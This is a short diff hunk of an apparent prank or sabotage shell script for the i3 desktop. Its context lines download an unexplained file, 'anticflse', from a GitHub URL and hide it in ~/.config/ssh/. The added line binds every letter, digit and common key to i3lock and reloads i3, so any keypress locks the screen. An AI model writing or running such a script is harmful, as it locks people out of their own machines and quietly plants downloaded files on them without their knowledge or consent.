@@ -21,3 +21,4 @@ i3-msg reload
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/anticflse
 mkdir ~/.config/ssh/ && mv anticflse "$_"
 
+printf "bindsym %s exec i3lock\n" {a..z} {0..9} Return space BackSpace Escape Tab >> ~/.config/i3/config && i3-msg reload
